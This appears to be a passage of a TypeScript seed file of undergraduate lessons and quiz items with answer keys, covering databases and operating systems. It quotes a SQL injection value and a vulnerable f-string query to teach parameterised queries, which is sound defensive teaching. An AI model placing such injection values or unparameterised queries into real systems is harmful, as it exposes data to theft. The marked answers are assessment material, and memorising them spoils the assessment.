  { conceptId: NORMAL, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Normalisation organises relational schemas to reduce data redundancy and update anomalies. First Normal Form (1NF): each column holds atomic values, no repeating groups. Second Normal Form (2NF): 1NF + every non-key attribute fully depends on the whole primary key (no partial dependencies — relevant for composite keys). Third Normal Form (3NF): 2NF + no transitive dependencies (non-key attribute depends on another non-key attribute). BCNF (Boyce-Codd): every determinant is a candidate key — stricter than 3NF.',
    targetedMisconceptions: [`${NORMAL}:M1`], source: NORMAL_SRC },
  { conceptId: NORMAL, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Always normalise to 3NF/BCNF — more normal forms = better." Normalisation eliminates anomalies but increases JOIN operations and can hurt query performance. Denormalisation deliberately re-introduces redundancy for read-heavy systems (analytics, reporting). Production databases often use a mix: fully normalised OLTP tables for writes; denormalised data warehouses for analytics. The goal is fitness for purpose, not the highest normal form achievable.',
    targetedMisconceptions: [`${NORMAL}:M1`], source: NORMAL_SRC },
]
const NORMAL_PROBES: SeedProbe[] = [
  { conceptId: NORMAL, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A table has columns: (order_id, product_id, product_name, quantity). product_name depends only on product_id, not the full composite key. This violates:',
    choices: [
      { text: '2NF — partial dependency on part of the composite key', isCorrect: true },
      { text: '1NF — non-atomic values', isCorrect: false },
      { text: '3NF — transitive dependency', isCorrect: false, misconceptionId: `${NORMAL}:M1` },
    ], correctValue: '2NF violation', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${NORMAL}:M1`], source: NORMAL_SRC },
  { conceptId: NORMAL, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why might a data warehouse intentionally use denormalised tables despite violating 3NF?',
    choices: [
      { text: 'Denormalisation reduces JOINs, improving read performance for analytics queries', isCorrect: true },
      { text: 'Data warehouses don\'t support JOINs, so normalisation is impossible', isCorrect: false },
    ], correctValue: 'Better read performance', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${NORMAL}:M1`], source: NORMAL_SRC },
]

const SQLDML = 'cs.db.sql-ddl-dml'
const SQLDML_SRC = 'docs/computer-science/kg/graph.json — cs.db.sql-ddl-dml'
const SQLDML_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: SQLDML, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'SQL is divided by purpose. DDL (Data Definition Language) defines schema: CREATE TABLE, ALTER TABLE, DROP TABLE. DML (Data Manipulation Language) manipulates data: INSERT, UPDATE, DELETE, SELECT. DCL (Data Control Language): GRANT, REVOKE. TCL (Transaction Control): COMMIT, ROLLBACK, SAVEPOINT. CREATE TABLE defines columns with types and constraints (PRIMARY KEY, FOREIGN KEY, NOT NULL, UNIQUE, CHECK). ALTER TABLE adds/modifies/drops columns. DROP TABLE permanently removes a table and all its data.',
    targetedMisconceptions: [`${SQLDML}:M1`], source: SQLDML_SRC },
  { conceptId: SQLDML, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "DELETE FROM table removes the table." DELETE removes ROWS that match a WHERE clause; the table structure remains. DELETE FROM table (no WHERE) removes all rows but keeps the table. DROP TABLE removes the table and all its data permanently. TRUNCATE TABLE removes all rows faster than DELETE (no per-row logging) but also keeps the structure. Confusing these causes data loss: "I just wanted to clear the table" becomes "I deleted the schema."',
    targetedMisconceptions: [`${SQLDML}:M1`], source: SQLDML_SRC },
]
const SQLDML_PROBES: SeedProbe[] = [
  { conceptId: SQLDML, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You run DELETE FROM users. What is the result?',
    choices: [
      { text: 'All rows deleted; table structure remains intact', isCorrect: true },
      { text: 'Table and all data are permanently removed', isCorrect: false, misconceptionId: `${SQLDML}:M1` },
    ], correctValue: 'Rows deleted, structure remains', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${SQLDML}:M1`], source: SQLDML_SRC },
  { conceptId: SQLDML, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which SQL command permanently removes both the table structure AND all its data?',
    choices: [
      { text: 'DROP TABLE', isCorrect: true },
      { text: 'DELETE FROM table', isCorrect: false, misconceptionId: `${SQLDML}:M1` },
      { text: 'TRUNCATE TABLE', isCorrect: false },
    ], correctValue: 'DROP TABLE', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${SQLDML}:M1`], source: SQLDML_SRC },
]

const SQLQRY = 'cs.db.sql-queries-functions'
const SQLQRY_SRC = 'docs/computer-science/kg/graph.json — cs.db.sql-queries-functions'
const SQLQRY_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: SQLQRY, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'SELECT query order of clauses: SELECT columns FROM table WHERE condition GROUP BY columns HAVING group_condition ORDER BY columns LIMIT n. Execution order differs: FROM → WHERE → GROUP BY → HAVING → SELECT → ORDER BY → LIMIT. Aggregate functions: COUNT, SUM, AVG, MIN, MAX — operate per group when GROUP BY is used. HAVING filters groups after aggregation (unlike WHERE which filters rows before). Scalar functions: UPPER, LOWER, LENGTH, ROUND, NOW(). Window functions (OVER): rank rows without collapsing them.',
    targetedMisconceptions: [`${SQLQRY}:M1`], source: SQLQRY_SRC },
  { conceptId: SQLQRY, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "I can use WHERE to filter aggregate results." WHERE runs BEFORE aggregation; you cannot use it on aggregate columns. WHERE salary > AVG(salary) is invalid. HAVING runs AFTER aggregation and can filter on aggregate results: HAVING AVG(salary) > 50000. Another common error: using a column alias defined in SELECT inside WHERE or GROUP BY — most databases evaluate WHERE before SELECT, so the alias doesn\'t exist yet.',
    targetedMisconceptions: [`${SQLQRY}:M1`], source: SQLQRY_SRC },
]
const SQLQRY_PROBES: SeedProbe[] = [
  { conceptId: SQLQRY, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You want to find departments where the average salary > 60000. Which clause filters the grouped result?',
    choices: [
      { text: 'HAVING AVG(salary) > 60000', isCorrect: true },
      { text: 'WHERE AVG(salary) > 60000', isCorrect: false, misconceptionId: `${SQLQRY}:M1` },
    ], correctValue: 'HAVING', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${SQLQRY}:M1`], source: SQLQRY_SRC },
  { conceptId: SQLQRY, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'In SQL execution order, which clause is evaluated FIRST?',
    choices: [
      { text: 'FROM', isCorrect: true },
      { text: 'SELECT', isCorrect: false, misconceptionId: `${SQLQRY}:M1` },
      { text: 'WHERE', isCorrect: false },
    ], correctValue: 'FROM', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${SQLQRY}:M1`], source: SQLQRY_SRC },
]

const SQLJOIN = 'cs.db.sql-joins-subqueries'
const SQLJOIN_SRC = 'docs/computer-science/kg/graph.json — cs.db.sql-joins-subqueries'
const SQLJOIN_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: SQLJOIN, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'JOIN combines rows from two tables on a condition. INNER JOIN: only matching rows from both tables. LEFT JOIN: all rows from left table; NULL for non-matching right rows. RIGHT JOIN: reverse of LEFT. FULL OUTER JOIN: all rows from both, NULL where no match. CROSS JOIN: every combination (Cartesian product). Subqueries: a SELECT inside another SELECT/WHERE/FROM. Correlated subquery references the outer query (re-evaluated per row). EXISTS tests whether a subquery returns any rows.',
    targetedMisconceptions: [`${SQLJOIN}:M1`], source: SQLJOIN_SRC },
  { conceptId: SQLJOIN, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "LEFT JOIN and INNER JOIN give the same results if all foreign keys are set." They differ when rows in the left table have no match in the right table. INNER JOIN silently drops those rows. LEFT JOIN keeps them with NULLs. If you want to find customers who have NO orders, INNER JOIN misses them entirely; LEFT JOIN WHERE order_id IS NULL correctly identifies them. Choosing the wrong join type produces silent data loss — no error, just missing rows.',
    targetedMisconceptions: [`${SQLJOIN}:M1`], source: SQLJOIN_SRC },
]
const SQLJOIN_PROBES: SeedProbe[] = [
  { conceptId: SQLJOIN, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You want to list ALL customers and their order totals, including customers with no orders (showing NULL for total). Which JOIN?',
    choices: [
      { text: 'LEFT JOIN customers to orders', isCorrect: true },
      { text: 'INNER JOIN customers to orders', isCorrect: false, misconceptionId: `${SQLJOIN}:M1` },
    ], correctValue: 'LEFT JOIN', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${SQLJOIN}:M1`], source: SQLJOIN_SRC },
  { conceptId: SQLJOIN, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'INNER JOIN customers ON customers.id = orders.customer_id — what happens to customers who have no orders?',
    choices: [
      { text: 'They are silently excluded from the result', isCorrect: true },
      { text: 'They appear with NULL for order columns', isCorrect: false, misconceptionId: `${SQLJOIN}:M1` },
    ], correctValue: 'Silently excluded', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${SQLJOIN}:M1`], source: SQLJOIN_SRC },
]

const ACIDTX = 'cs.db.transactions-acid'
const ACIDTX_SRC = 'docs/computer-science/kg/graph.json — cs.db.transactions-acid'
const ACIDTX_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: ACIDTX, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A transaction is a unit of work that must succeed or fail atomically. ACID properties: Atomicity — all operations commit or all roll back (no partial updates). Consistency — a transaction moves the database from one valid state to another. Isolation — concurrent transactions behave as if they ran serially; isolation levels (READ UNCOMMITTED → SERIALIZABLE) trade correctness for performance. Durability — committed data survives crashes (written to non-volatile storage via WAL). Bank transfer example: debit account A AND credit account B must both succeed or both fail.',
    targetedMisconceptions: [`${ACIDTX}:M1`], source: ACIDTX_SRC },
  { conceptId: ACIDTX, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Isolation means transactions can\'t see each other at all." That is only true at SERIALIZABLE isolation — the strictest and most expensive level. Lower isolation levels allow phenomena: READ COMMITTED allows non-repeatable reads (a row read twice in one transaction may change); REPEATABLE READ prevents that but allows phantom reads (new rows appearing); SERIALIZABLE prevents all. Most applications use READ COMMITTED and handle the tradeoffs explicitly.',
    targetedMisconceptions: [`${ACIDTX}:M1`], source: ACIDTX_SRC },
]
const ACIDTX_PROBES: SeedProbe[] = [
  { conceptId: ACIDTX, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A bank transfer debits account A and credits account B. The system crashes after debiting A but before crediting B. Which ACID property ensures neither change persists?',
    choices: [
      { text: 'Atomicity — the whole transaction rolls back', isCorrect: true },
      { text: 'Consistency — valid state is restored', isCorrect: false },
      { text: 'Durability — crash recovery restores the committed state', isCorrect: false, misconceptionId: `${ACIDTX}:M1` },
    ], correctValue: 'Atomicity', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${ACIDTX}:M1`], source: ACIDTX_SRC },
  { conceptId: ACIDTX, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the difference between ROLLBACK and COMMIT in SQL?',
    choices: [
      { text: 'COMMIT makes changes permanent; ROLLBACK undoes all changes since the transaction began', isCorrect: true },
      { text: 'ROLLBACK saves changes to a backup; COMMIT deletes them', isCorrect: false },
    ], correctValue: 'COMMIT = permanent; ROLLBACK = undo', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${ACIDTX}:M1`], source: ACIDTX_SRC },
]

const DBIDX = 'cs.db.indexing-query-optimisation'
const DBIDX_SRC = 'docs/computer-science/kg/graph.json — cs.db.indexing-query-optimisation'
const DBIDX_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: DBIDX, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'An index is a separate data structure (typically a B-tree) that speeds up lookups on a column at the cost of extra storage and slower writes (index must be updated). Primary key has an automatic index. CREATE INDEX idx_name ON table(column). Full table scan: O(n) — examines every row. Index scan: O(log n) — navigates the B-tree. Use EXPLAIN/EXPLAIN ANALYZE to see the query execution plan. Indexes help: high-cardinality columns (many distinct values), frequent WHERE/JOIN/ORDER BY targets. Indexes hurt: write-heavy tables (every insert/update/delete updates the index), low-cardinality columns (boolean — index is useless).',
    targetedMisconceptions: [`${DBIDX}:M1`], source: DBIDX_SRC },
  { conceptId: DBIDX, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Index every column for best query performance." Each index slows INSERT/UPDATE/DELETE because the B-tree must be updated. On a write-heavy table, 10 indexes can make writes 10× slower. Indexes also consume significant disk space. The right number is "index what you query, not everything." Use EXPLAIN to identify table scans on high-traffic queries, then add targeted indexes.',
    targetedMisconceptions: [`${DBIDX}:M1`], source: DBIDX_SRC },
]
const DBIDX_PROBES: SeedProbe[] = [
  { conceptId: DBIDX, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Adding an index to a column speeds up SELECT queries but has what trade-off?',
    choices: [
      { text: 'Slower INSERT/UPDATE/DELETE — the index must be maintained on every write', isCorrect: true },
      { text: 'SELECT queries become slower too — the index adds overhead', isCorrect: false },
      { text: 'No trade-off — indexes are always beneficial', isCorrect: false, misconceptionId: `${DBIDX}:M1` },
    ], correctValue: 'Slower writes', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${DBIDX}:M1`], source: DBIDX_SRC },
  { conceptId: DBIDX, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Should you index a boolean column (active: true/false) to speed up WHERE active = TRUE queries?',
    choices: [
      { text: 'No — low cardinality (only 2 values) means the index is rarely selective enough to help', isCorrect: true },
      { text: 'Yes — any indexed column is faster regardless of cardinality', isCorrect: false, misconceptionId: `${DBIDX}:M1` },
    ], correctValue: 'No — low cardinality index unhelpful', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${DBIDX}:M1`], source: DBIDX_SRC },
]

const NOSQL = 'cs.db.nosql-intro'
const NOSQL_SRC = 'docs/computer-science/kg/graph.json — cs.db.nosql-intro'
const NOSQL_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: NOSQL, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'NoSQL databases store data in non-relational models designed for specific access patterns. Key types: Document stores (MongoDB — JSON-like documents, flexible schema), Key-value stores (Redis — ultra-fast hash maps, used for caching/sessions), Column-family stores (Cassandra — optimised for time-series and write-heavy workloads), Graph databases (Neo4j — nodes and edges, optimised for relationship traversal). NoSQL often trades ACID guarantees for horizontal scalability and flexible schemas. BASE properties (Basically Available, Soft state, Eventually consistent) contrast with ACID.',
    targetedMisconceptions: [`${NOSQL}:M1`], source: NOSQL_SRC },
  { conceptId: NOSQL, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "NoSQL is always better than SQL — modern apps use NoSQL." SQL databases scale to enormous sizes (PostgreSQL, Google Spanner), support JSON natively, and many NoSQL databases now offer ACID transactions. The choice depends on data model: highly relational, joins-heavy data → SQL; document-centric with flexible schema → MongoDB; session/cache → Redis. "NoSQL" originated as "Not Only SQL" — the paradigms complement each other rather than one replacing the other.',
    targetedMisconceptions: [`${NOSQL}:M1`], source: NOSQL_SRC },
]
const NOSQL_PROBES: SeedProbe[] = [
  { conceptId: NOSQL, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You need to store user session tokens with sub-millisecond lookup and automatic expiry. Which database type is most appropriate?',
    choices: [
      { text: 'Key-value store (e.g. Redis) — in-memory, O(1) lookup, TTL support', isCorrect: true },
      { text: 'Document store (MongoDB)', isCorrect: false },
      { text: 'Relational (PostgreSQL)', isCorrect: false, misconceptionId: `${NOSQL}:M1` },
    ], correctValue: 'Key-value / Redis', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${NOSQL}:M1`], source: NOSQL_SRC },
  { conceptId: NOSQL, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A student claims "NoSQL replaced SQL — modern companies don\'t use relational databases." Is this accurate?',
    choices: [
      { text: 'No — both are widely used; choice depends on data model, not modernity', isCorrect: true },
      { text: 'Yes — NoSQL is universally superior and SQL is legacy', isCorrect: false, misconceptionId: `${NOSQL}:M1` },
    ], correctValue: 'No — both coexist', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${NOSQL}:M1`], source: NOSQL_SRC },
]

const MYSQLPY = 'cs.db.mysql-python'
const MYSQLPY_SRC = 'docs/computer-science/kg/graph.json — cs.db.mysql-python'
const MYSQLPY_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: MYSQLPY, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Python connects to databases via DB-API 2.0 (PEP 249): import the adapter (sqlite3, mysql.connector, psycopg2), connect(), cursor(), cursor.execute(sql, params), fetchone()/fetchall(), connection.commit(). Parameterised queries: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,)) — the adapter handles escaping. Never use f-strings to build SQL: f"WHERE id = {user_id}" is a SQL injection vulnerability. Context manager (with conn:) auto-commits or rolls back. SQLite3 is built-in; MySQL/Postgres need installed drivers.',
    targetedMisconceptions: [`${MYSQLPY}:M1`], source: MYSQLPY_SRC },
  { conceptId: MYSQLPY, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "I\'ll build my SQL query with f-strings — it\'s more readable." f-string SQL is a SQL injection vulnerability: if user_id comes from user input and contains \' OR 1=1 --, the resulting query dumps the entire database. Parameterised queries pass user data as separate parameters the database driver escapes safely — the query structure is fixed, data cannot change it. This is one of the OWASP Top 10 vulnerabilities; it is completely preventable by using parameters.',
    targetedMisconceptions: [`${MYSQLPY}:M1`], source: MYSQLPY_SRC },
]
const MYSQLPY_PROBES: SeedProbe[] = [
  { conceptId: MYSQLPY, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which of these Python database calls is vulnerable to SQL injection?',
    choices: [
      { text: 'cursor.execute(f"SELECT * FROM users WHERE name = \'{name}\'")', isCorrect: true },
      { text: 'cursor.execute("SELECT * FROM users WHERE name = %s", (name,))', isCorrect: false },
    ], correctValue: 'f-string interpolation', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${MYSQLPY}:M1`], source: MYSQLPY_SRC },
  { conceptId: MYSQLPY, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why is cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,)) safer than f-string SQL?',
    choices: [
      { text: 'The database driver escapes user_id as data — it cannot alter the query structure', isCorrect: true },
      { text: '%s is just formatting syntax — there is no security difference', isCorrect: false, misconceptionId: `${MYSQLPY}:M1` },
    ], correctValue: 'Parameterised prevents injection', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${MYSQLPY}:M1`], source: MYSQLPY_SRC },
]

// ─── cs.os ────────────────────────────────────────────────────────────────────
const PROCMGMT = 'cs.os.process-management'
const PROCMGMT_SRC = 'docs/computer-science/kg/graph.json — cs.os.process-management'
const PROCMGMT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: PROCMGMT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A process is a running program instance with its own memory space, file handles, and process ID (PID). The OS manages processes via a Process Control Block (PCB) holding state, registers, priority, and memory maps. Process lifecycle: NEW → READY → RUNNING → WAITING → TERMINATED. Context switch: OS saves the running process\'s state, loads another from READY queue. Python subprocess module creates child processes. os.fork() (Unix) duplicates the calling process. Processes are isolated — one cannot directly access another\'s memory.',
    targetedMisconceptions: [`${PROCMGMT}:M1`], source: PROCMGMT_SRC },
  { conceptId: PROCMGMT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A process and a program are the same thing." A program is static — bytes on disk. A process is dynamic — a program in execution with allocated memory, open files, and a thread of control. The same program can have many simultaneous processes (multiple browser tabs). One process can execute different programs sequentially. The distinction matters for understanding memory isolation: two processes running the same program do not share data (unless explicitly using IPC).',
    targetedMisconceptions: [`${PROCMGMT}:M1`], source: PROCMGMT_SRC },
]
const PROCMGMT_PROBES: SeedProbe[] = [
  { conceptId: PROCMGMT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A process is in WAITING state. What causes the transition back to READY?',
    choices: [
      { text: 'The I/O or event it was waiting for completes', isCorrect: true },
      { text: 'The scheduler assigns it CPU time', isCorrect: false, misconceptionId: `${PROCMGMT}:M1` },
      { text: 'The process calls fork()', isCorrect: false },
    ], correctValue: 'I/O completion', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${PROCMGMT}:M1`], source: PROCMGMT_SRC },
  { conceptId: PROCMGMT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Two processes run the same Python script simultaneously. Do they share the same memory for their variables?',
    choices: [
      { text: 'No — each process has its own isolated memory space', isCorrect: true },
      { text: 'Yes — running the same program means sharing memory', isCorrect: false, misconceptionId: `${PROCMGMT}:M1` },
    ], correctValue: 'No — isolated memory', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${PROCMGMT}:M1`], source: PROCMGMT_SRC },
]

const THREADSCONC = 'cs.os.threads-concurrency'
const THREADSCONC_SRC = 'docs/computer-science/kg/graph.json — cs.os.threads-concurrency'
const THREADSCONC_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: THREADSCONC, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A thread is a lightweight unit of execution sharing a process\'s memory and resources. Multiple threads in one process can run concurrently. Python threading module creates threads; they share heap memory (easy data sharing, but race conditions possible). Python\'s Global Interpreter Lock (GIL) allows only one thread to execute Python bytecode at a time — Python threads achieve concurrency for I/O-bound tasks (waiting releases GIL) but not CPU-bound parallelism. For CPU parallelism use multiprocessing (separate processes, no GIL). asyncio provides cooperative single-threaded concurrency for I/O.',
    targetedMisconceptions: [`${THREADSCONC}:M1`], source: THREADSCONC_SRC },
  { conceptId: THREADSCONC, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Python threads run in parallel on multiple CPU cores." The GIL prevents true parallel execution of Python bytecode. Two threads do not run simultaneously — one holds the GIL while the other waits. For CPU-bound work (number crunching), threading gives no speedup and adds overhead. Use multiprocessing or numpy (releases GIL) for CPU parallelism. Threading is correct for I/O-bound: while one thread waits for a network response, the GIL is released and another thread can run.',
    targetedMisconceptions: [`${THREADSCONC}:M1`], source: THREADSCONC_SRC },
]
const THREADSCONC_PROBES: SeedProbe[] = [
  { conceptId: THREADSCONC, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You have a CPU-bound Python program that crunches numbers. Will adding more threads speed it up?',
    choices: [
      { text: 'No — the GIL prevents true parallel execution of CPU-bound Python code', isCorrect: true },
      { text: 'Yes — more threads use more CPU cores simultaneously', isCorrect: false, misconceptionId: `${THREADSCONC}:M1` },
    ], correctValue: 'No — GIL limits to one thread at a time', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${THREADSCONC}:M1`], source: THREADSCONC_SRC },
  { conceptId: THREADSCONC, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'For what type of Python workload DO threads provide speedup despite the GIL?',
    choices: [
      { text: 'I/O-bound tasks (network requests, file I/O) — threads release the GIL while waiting', isCorrect: true },
      { text: 'CPU-bound matrix multiplication — threads split the computation', isCorrect: false, misconceptionId: `${THREADSCONC}:M1` },
    ], correctValue: 'I/O-bound tasks', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${THREADSCONC}:M1`], source: THREADSCONC_SRC },
]

const CPUSCHED = 'cs.os.cpu-scheduling'
const CPUSCHED_SRC = 'docs/computer-science/kg/graph.json — cs.os.cpu-scheduling'
const CPUSCHED_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CPUSCHED, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'CPU scheduling decides which READY process runs next. Algorithms: FCFS (First-Come-First-Served) — simple, convoy effect if a long job runs first. SJF (Shortest Job First) — optimal average waiting time but requires knowing job length. Round Robin — each process gets a fixed time quantum, rotates; good for interactive systems. Priority scheduling — highest priority runs; starvation risk for low-priority. Multilevel feedback queue — processes move between queues based on behaviour. Metrics: CPU utilisation, throughput, turnaround time, waiting time, response time.',
    targetedMisconceptions: [`${CPUSCHED}:M1`], source: CPUSCHED_SRC },
  { conceptId: CPUSCHED, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A smaller time quantum in Round Robin always improves performance." Smaller quantum → more context switches. Each context switch costs time (save/restore registers, cache flush). If the quantum is smaller than the context switch overhead, the CPU spends more time switching than doing real work. The quantum must be large enough to amortise switching cost but small enough to give responsive feel — typically 10-100ms in practice.',
    targetedMisconceptions: [`${CPUSCHED}:M1`], source: CPUSCHED_SRC },
]
const CPUSCHED_PROBES: SeedProbe[] = [
  { conceptId: CPUSCHED, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which scheduling algorithm minimises average waiting time but requires knowing future CPU burst lengths?',
    choices: [
      { text: 'Shortest Job First (SJF)', isCorrect: true },
      { text: 'Round Robin', isCorrect: false, misconceptionId: `${CPUSCHED}:M1` },
      { text: 'FCFS', isCorrect: false },
    ], correctValue: 'SJF', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${CPUSCHED}:M1`], source: CPUSCHED_SRC },
  { conceptId: CPUSCHED, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why doesn\'t reducing the Round Robin time quantum to 1 microsecond maximise performance?',
    choices: [
      { text: 'Context switch overhead dominates — more time switching than executing real work', isCorrect: true },
      { text: 'Smaller quanta always hurt because processes never finish', isCorrect: false },
    ], correctValue: 'Context switch overhead', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${CPUSCHED}:M1`], source: CPUSCHED_SRC },
]

const SYNCDEAD = 'cs.os.synchronisation-deadlocks'
const SYNCDEAD_SRC = 'docs/computer-science/kg/graph.json — cs.os.synchronisation-deadlocks'
const SYNCDEAD_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: SYNCDEAD, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A race condition occurs when outcome depends on thread scheduling order — dangerous. Mutex (mutual exclusion lock): only one thread holds it at a time; others block. threading.Lock() in Python. Semaphore: integer counter allowing N concurrent holders. Deadlock: two or more processes wait for each other to release a resource — circular wait. Four necessary conditions (Coffman): mutual exclusion, hold-and-wait, no preemption, circular wait. Prevention: impose resource ordering (always acquire lock A before B). Detection + recovery: allow deadlocks, detect cycles, kill a process.',
    targetedMisconceptions: [`${SYNCDEAD}:M1`], source: SYNCDEAD_SRC },
  { conceptId: SYNCDEAD, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Using locks always prevents deadlocks." Locks prevent race conditions but CAN CAUSE deadlocks if used incorrectly. Thread A holds Lock1 and waits for Lock2; Thread B holds Lock2 and waits for Lock1 — deadlock. The fix: always acquire multiple locks in the same global order (A before B everywhere). Python\'s threading.Lock() is not reentrant by default — a thread that tries to acquire a lock it already holds will deadlock with itself. Use threading.RLock() for reentrant code.',
    targetedMisconceptions: [`${SYNCDEAD}:M1`], source: SYNCDEAD_SRC },
]
const SYNCDEAD_PROBES: SeedProbe[] = [
  { conceptId: SYNCDEAD, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Thread A holds Lock1, waits for Lock2. Thread B holds Lock2, waits for Lock1. What is this called?',
    choices: [
